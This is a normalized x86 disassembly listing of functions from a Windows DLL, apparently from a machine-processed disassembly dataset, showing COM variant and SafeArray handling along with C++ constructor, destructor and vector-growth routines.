push 0x1
mov ecx edi
call eax
push 0xc
call sub_10012ca7
mov esi eax
add esp 0x4
mov [ ebp - 0x18 ] esi
test esi esi
je r-xdata
mov esi [ ebp - 0x14 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_1000b2d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c028
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi + 0x8 ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000b370
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x8 ]
push esi
mov [ edi ] r--data
call sub_1000b810
mov eax [ esi ]
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
je r-xdata
push eax
call sub_10012c4b
add esp 0x4
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call sub_10012c4b
add esp 0x4
sub_1000b3c0
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
push esi
mov [ edi ] r--data
call sub_1000b810
mov eax [ esi ]
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
je r-xdata
push eax
call sub_10012c4b
add esp 0x4
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call sub_10012c4b
add esp 0x4
sub_1000b410
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1001be48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ edi + 0x10 ]
sub esi [ edi + 0xc ]
mov ebx [ VariantInit@IAT ]
lea eax [ esp + 0x34 ]
mov ecx eax
push ecx
sar esi 0x4
mov [ esp + 0x28 ] eax
call ebx
lea eax [ esp + 0x2c ]
push eax
mov [ esp + 0x30 ] esi
push 0x1
mov edx 0x200c
xor esi esi
push 0xc
mov [ esp + 0x40 ] dx
mov [ esp + 0x3c ] esi
call [ SafeArrayCreate@IAT ]
mov [ esp + 0x3c ] eax
lea ecx [ esp + 0x44 ]
mov edx ecx
mov [ esp + 0x80 ] esi
push edx
mov [ esp + 0x2c ] ecx
call ebx
lea eax [ esp + 0x64 ]
mov ecx eax
push ecx
mov [ esp + 0x30 ] eax
call ebx
mov [ esp + 0x80 ] 0x2
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov [ esp + 0x14 ] 0x0
cmp esi ebx
je r-xdata
mov ebx [ esp + 0x34 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
lea eax [ esp + 0x64 ]
push eax
lea eax [ esp + 0x48 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ esp + 0x50 ]
mov [ eax + 0x4 ] ebx
mov ebx [ esp + 0x54 ]
mov [ eax + 0x8 ] ebx
mov ebx [ esp + 0x58 ]
mov [ eax + 0xc ] ebx
mov eax [ edi + 0x8 ]
push eax
push ecx
mov ecx [ edx + 0x20 ]
call ecx
xor edi edi
cmp eax edi
jge r-xdata
lea esp [ esp ]
push 0x18
call sub_10012ca7
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ VariantClear@IAT ]
lea edx [ esp + 0x64 ]
push edx
call esi
lea eax [ esp + 0x44 ]
push eax
call esi
lea ecx [ esp + 0x34 ]
push ecx
call esi
xor eax eax
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov ecx [ esi + 0x8 ]
mov [ esp + 0x54 ] edx
mov edx [ esi + 0xc ]
mov [ esp + 0x58 ] eax
lea eax [ esp + 0x54 ]
mov [ esp + 0x5c ] ecx
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0x64 ] edx
mov edx [ esp + 0x40 ]
push ecx
push edx
call [ SafeArrayPutElement@IAT ]
inc [ esp + 0x14 ]
add esi 0x10
cmp esi ebx
jne r-xdata
mov edx 0x200c
cmp [ esp + 0x44 ] dx
jne r-xdata
mov [ eax ] r--data
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x4 ] esi
mov edi eax
mov esi [ VariantClear@IAT ]
lea edx [ esp + 0x64 ]
push edx
call esi
lea eax [ esp + 0x44 ]
push eax
call esi
lea ecx [ esp + 0x34 ]
push ecx
call esi
mov eax edi
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ esp + 0x4c ]
push esi
call [ SafeArrayGetDim@IAT ]
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x20 ]
push eax
push 0x1
push esi
call [ SafeArrayGetLBound@IAT ]
test eax eax
js r-xdata
lea ecx [ esp + 0x1c ]
push ecx
push 0x1
push esi
call [ SafeArrayGetUBound@IAT ]
test eax eax
js r-xdata
mov eax [ esp + 0x20 ]
mov [ esp + 0x18 ] eax
cmp eax [ esp + 0x1c ]
jg r-xdata
mov ebx [ SafeArrayGetElement@IAT ]
lea ecx [ ecx ]
mov eax [ esp + 0x18 ]
inc eax
mov [ esp + 0x18 ] eax
cmp eax [ esp + 0x1c ]
jle r-xdata
mov edx [ esp + 0x54 ]
mov ecx [ esp + 0x58 ]
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ esp + 0x6c ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x70 ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] ecx
mov eax edi
call sub_1000b780
lea edx [ esp + 0x54 ]
push edx
call [ VariantInit@IAT ]
lea eax [ esp + 0x54 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
push esi
call ebx
test eax eax
js r-xdata
sub_1000b680
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c028
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000b6f0
push ebp
mov ebp esp
push edi
mov edi eax
mov eax [ edi + 0x10 ]
lea ecx [ ebp + 0x8 ]
cmp ecx eax
jae r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov ecx [ edi + 0xc ]
lea edx [ ebp + 0x8 ]
cmp ecx edx
ja r-xdata
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
lea edx [ edi + 0xc ]
call sub_1000b8a0
push esi
mov esi edx
sub esi ecx
cmp eax [ edi + 0x14 ]
jne r-xdata
add [ edi + 0x10 ] 0x10
pop edi
pop ebp
retn 0x10
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp + 0x14 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x10 ]
and esi 0xfffffff0
add esi [ edi + 0xc ]
test eax eax
je r-xdata
lea edx [ edi + 0xc ]
call sub_1000b8a0
add [ edi + 0x10 ] 0x10
pop esi
pop edi
pop ebp
retn 0x10
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ esi + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
sub_1000b780
push ebp
mov ebp esp
push edi
mov edi eax
mov eax [ edi + 0xc ]
lea ecx [ ebp + 0x8 ]
cmp ecx eax
jae r-xdata
cmp eax [ edi + 0x10 ]
jne r-xdata
mov ecx [ edi + 0x8 ]
lea edx [ ebp + 0x8 ]
cmp ecx edx
ja r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
lea edx [ edi + 0x8 ]
call sub_1000b8a0
push esi
mov esi edx
sub esi ecx
cmp eax [ edi + 0x10 ]
jne r-xdata
add [ edi + 0xc ] 0x10
pop edi
pop ebp
retn 0x10
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp + 0x14 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0xc ]
and esi 0xfffffff0
add esi [ edi + 0x8 ]
test eax eax
je r-xdata
lea edx [ edi + 0x8 ]
call sub_1000b8a0
add [ edi + 0xc ] 0x10
pop esi
pop edi
pop ebp
retn 0x10
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ esi + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
sub_1000b810
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x8 ]
sub esp 0x14
push ebx
push esi
mov esi [ eax ]
push edi
mov edi [ eax + 0x4 ]
cmp esi edi
je r-xdata
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
mov ebx [ VariantClear@IAT ]
mov edi edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edx
cmp edx edx
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov edx [ esi + 0x8 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x10 ] eax
mov eax [ esi + 0xc ]
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] eax
call ebx
add esi 0x10
cmp esi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov esi [ eax ]
mov [ ecx ] esi
mov esi [ eax + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ eax + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ eax + 0xc ]
mov [ ecx + 0xc ] esi
add eax 0x10
add ecx 0x10
cmp eax edx
jne r-xdata
sub_1000b8a0
mov eax [ edx + 0x4 ]
push esi
mov esi [ edx ]
sub eax esi
sar eax 0x4
cmp eax 0xffffffe
jbe r-xdata
mov ecx [ edx + 0x8 ]
sub ecx esi
inc eax
sar ecx 0x4
cmp eax ecx
jbe r-xdata
push r--data
call sub_100126ab
pop esi
retn
push edi
mov esi ecx
shr esi 0x1
mov edi 0xfffffff
sub edi esi
cmp edi ecx
pop edi
jae r-xdata
add ecx esi
xor ecx ecx
jmp r-xdata
pop esi
jmp sub_1000b8f0
mov ecx eax
cmp ecx eax
jae r-xdata
sub_1000b8f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001be10
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov esi edx
cmp ebx 0xfffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x4
cmp eax ebx
jae r-xdata
push r--data
call sub_100126ab
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1000b9b0
mov [ ebp - 0x4 ] 0x0
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
mov [ ebp - 0x14 ] eax
mov edi [ ebp - 0x14 ]
push edi
call sub_1000ba00
mov eax [ esi ]
mov edi [ esi + 0x4 ]
add esp 0x4
sub edi eax
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
shl ebx 0x4
add ebx eax
and edi 0xfffffff0
add edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] edi
mov [ esi ] eax
push eax
call sub_10012c4b
add esp 0x4
sub_1000b9b0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0xfffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10012808
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10013848
shl ecx 0x4
push ecx
call sub_10012ca7
add esp 0x4
test eax eax
jne r-xdata
sub_1000ba00
cmp ecx edx
je r-xdata
retn
push esi
add ecx 0x10
add eax 0x10
cmp ecx edx
jne r-xdata
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
mov esi [ ecx + 0x8 ]
mov [ eax + 0x8 ] esi
mov esi [ ecx + 0xc ]
mov [ eax + 0xc ] esi
test eax eax
je r-xdata
pop esi
sub_1000ba40
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d5a8
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ ebp + 0x8 ]
mov edx [ edi ]
xor esi esi
push esi
push r--data
push 0x1
push esi
push esi
push eax
mov eax [ edx + 0x4 ]
call eax
push eax
mov ecx r--data
call sub_1000a980
push 0x1c
mov ebx eax
call sub_10012ca7
add esp 0x20
cmp eax esi
je r-xdata
mov eax ebx
call sub_1000a4b0
test ebx ebx
je r-xdata
mov [ eax ] r--data
mov [ eax + 0xc ] esi
mov [ eax + 0x10 ] esi
mov [ eax + 0x14 ] esi
lea ecx [ edi - 0x8 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] r--data
mov esi eax
add edi 0xfffffff8
push edi
mov ecx esi
call sub_1000b410
mov [ ebp + 0x8 ] esi
xor ecx ecx
test eax eax
setne cl
mov [ ebp - 0x4 ] 0x0
mov edi ecx
test eax eax
je r-xdata
mov edx [ ebx ]
mov eax [ edx ]
push 0x1
mov ecx ebx
call eax
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
sub_1000bb30
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1001d580
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x1c
call sub_10012ca7
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
xor edi edi
mov [ eax ] r--data
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
mov [ eax + 0x14 ] ebx
lea ecx [ esi - 0x8 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] r--data
mov edi eax
jmp r-xdata
mov [ esp + 0x38 ] 0x0
cmp esi ebx
je r-xdata
mov edx [ esi + 0xc ]
sub edx [ esi + 0x8 ]
sar edx 0x4
test edx edx
je r-xdata
add esi 0xfffffff8
push esi
mov ecx edi
call sub_1000b410
mov esi eax
mov [ esp + 0x14 ] edi
mov [ esp + 0x38 ] ebx
mov [ esp + 0x18 ] esi
mov [ esp + 0x38 ] 0x1
cmp esi ebx
je r-xdata
mov [ esp + 0x38 ] 0xffffffff
cmp edi ebx
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
mov eax [ esi + 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ eax ]
mov [ esp + 0x20 ] edx
mov edx [ eax + 0x8 ]
mov [ esp + 0x24 ] edx
mov edx [ eax + 0xc ]
mov [ esp + 0x28 ] edx
cmp cx 0x8
jne r-xdata
or eax 0xffffffff
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
mov edx [ eax + 0x4 ]
mov [ esp + 0x20 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x28 ] eax
mov eax edx
mov [ esp + 0x1c ] ecx
lea ebx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push edx
mov ecx eax
call sub_10006da0
mov [ esp + 0x3c ] 0x0
mov edx [ esi ]
add esp 0x4
mov ebx eax
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
mov [ esp + 0x38 ] 0xffffffff
test edi edi
je r-xdata
mov eax ebx
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
sub_1000bca0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d5a8
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x1c
call sub_10012ca7
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
xor esi esi
mov [ eax ] r--data
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
mov [ eax + 0x14 ] ebx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] r--data
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_1000a830
push edi
mov ecx esi
call sub_1000b410
mov [ ebp + 0x8 ] esi
xor ecx ecx
cmp eax ebx
setne cl
mov [ ebp - 0x4 ] ebx
mov edi ecx
cmp eax ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
sub_1000bd50
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1001d580
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x1c
call sub_10012ca7
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
xor edi edi
mov [ eax ] r--data
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
mov [ eax + 0x14 ] ebx
lea ecx [ esi - 0x8 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] r--data
mov edi eax
jmp r-xdata
mov [ esp + 0x38 ] 0x0
cmp esi ebx
je r-xdata
mov eax [ esi + 0xc ]
sub eax [ esi + 0x8 ]
and eax 0xfffffff0
cmp eax 0x80
jne r-xdata
mov ax [ ebp + 0x8 ]
mov edx 0x12
mov [ esp + 0x1c ] dx
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
mov [ esp + 0x24 ] ax
sub esp 0x10
mov eax esp
mov [ eax ] ecx
mov ecx [ esp + 0x34 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x38 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
mov eax edi
call sub_1000b6f0
add esi 0xfffffff8
push esi
mov ecx edi
call sub_1000b410
mov esi eax
mov [ esp + 0x14 ] edi
mov [ esp + 0x38 ] ebx
mov [ esp + 0x18 ] esi
mov [ esp + 0x38 ] 0x1
cmp esi ebx
je r-xdata
mov [ esp + 0x38 ] 0xffffffff
cmp edi ebx
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
mov eax [ esi + 0x8 ]
mov edx [ eax + 0x70 ]
sub esp 0x10
mov ecx esp
mov [ ecx ] edx
mov edx [ eax + 0x74 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x78 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax + 0x7c ]
mov [ ecx + 0xc ] edx
mov edx [ eax + 0x60 ]
sub esp 0x10
mov ecx esp
mov [ ecx ] edx
mov edx [ eax + 0x64 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x68 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax + 0x6c ]
mov [ ecx + 0xc ] edx
mov edx [ eax + 0x50 ]
sub esp 0x10
mov ecx esp
mov [ ecx ] edx
mov edx [ eax + 0x54 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x58 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax + 0x5c ]
mov [ ecx + 0xc ] edx
mov edx [ eax + 0x40 ]
sub esp 0x10
mov ecx esp
mov [ ecx ] edx
mov edx [ eax + 0x44 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x48 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax + 0x4c ]
mov [ ecx + 0xc ] edx
mov edx [ eax + 0x30 ]
sub esp 0x10
mov ecx esp
mov [ ecx ] edx
mov edx [ eax + 0x34 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x38 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax + 0x3c ]
mov [ ecx + 0xc ] edx
mov edx [ eax + 0x20 ]
sub esp 0x10
mov ecx esp
mov [ ecx ] edx
mov edx [ eax + 0x24 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x28 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax + 0x2c ]
mov [ ecx + 0xc ] edx
mov edx [ eax + 0x10 ]
sub esp 0x10
mov ecx esp
mov [ ecx ] edx
mov edx [ eax + 0x14 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x18 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax + 0x1c ]
mov [ ecx + 0xc ] edx
mov edx [ eax ]
sub esp 0x10
mov ecx esp
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ ecx + 0x8 ] edx
mov [ ecx + 0xc ] eax
call sub_1000a590
mov [ esp + 0xb8 ] 0x0
mov edx [ esi ]
add esp 0x80
mov ebx eax
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
mov [ esp + 0x38 ] 0xffffffff
test edi edi
je r-xdata
xor eax eax
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
mov eax ebx
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
sub_1000bfa0
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push esi
push edi
push 0x0
push eax
mov eax [ ebp + 0x8 ]
mov edi ecx
mov ecx [ ebp + 0xc ]
push 0x1
push ecx
push edx
mov edx [ edi ]
push eax
mov eax [ edx + 0x4 ]
mov ecx edi
call eax
push eax
mov ecx r--data
call sub_1000a980
add esp 0x1c
mov esi eax
push esi
lea ecx [ edi - 0x8 ]
call sub_1000bca0
mov edi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
mov eax edi
sub_1000c000
push ebp
mov ebp esp
mov ecx [ ebx + 0xc ]
sub esp 0xc
push esi
xor esi esi
mov [ ebx + 0x14 ] esi
cmp ecx esi
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov ecx [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
call edx
test eax eax
je r-xdata
push edi
cmp edi [ ebp - 0x8 ]
jle r-xdata
inc edi
ror ecx 0x1
dec esi
jns r-xdata
mov ecx [ ebx + 0x8 ]
mov esi [ ebp - 0x4 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
inc esi
mov [ ebp - 0x4 ] esi
call eax
cmp esi eax
jb r-xdata
mov [ ebp - 0x8 ] edi
mov [ ebx + 0x14 ] eax
test edx ecx
jne r-xdata
mov ecx [ ebx + 0x8 ]
mov eax [ ecx ]
mov edx [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push edx
call eax
mov edx eax
xor edx [ ebp - 0xc ]
xor edi edi
lea esi [ edi + 0x1f ]
mov ecx 0x80000000
pop edi
sub_1000c090
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1001bde8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor edi edi
cmp [ ebx + 0x14 ] edi
je r-xdata
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x10 ] edi
je r-xdata
mov [ esp + 0x14 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x38 ] edi
mov ecx [ ebx + 0x10 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push edi
call edx
mov esi eax
test esi esi
je r-xdata
mov esi [ esp + 0x1c ]
cmp esi edi
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x1c ]
mov ecx esi
call edx
mov edi eax
mov eax [ esi ]
mov edx [ eax + 0x14 ]
mov ecx esi
call edx
cmp [ ebx + 0x14 ] eax
jne r-xdata
test esi esi
je r-xdata
mov ecx [ ebx + 0x10 ]
movzx eax [ esi ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push eax
call edx
add esi 0x2
cmp esi edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
mov eax [ esp + 0x14 ]
mov ecx [ ebx + 0x10 ]
mov edx [ ecx ]
inc eax
mov [ esp + 0x14 ] eax
push eax
mov eax [ edx + 0x8 ]
call eax
mov esi eax
test esi esi
jne r-xdata
test edi edi
je r-xdata
push esi
call sub_10012c4b
add esp 0x4
mov esi [ esp + 0x1c ]
mov edi [ esp + 0x20 ]
mov eax [ ebp + 0x8 ]
push eax
push edi
call sub_10013189
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
movzx ecx ax
lea eax [ esp + 0x18 ]
lea edi [ esp + 0x1c ]
mov [ esp + 0x18 ] ecx
call sub_1000c410
sub_1000c1b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c348
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebx ] r--data
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] edi
call sub_1000ac80
mov [ ebx + 0x4 ] eax
cmp eax edi
je r-xdata
call sub_1000c000
mov eax ebx
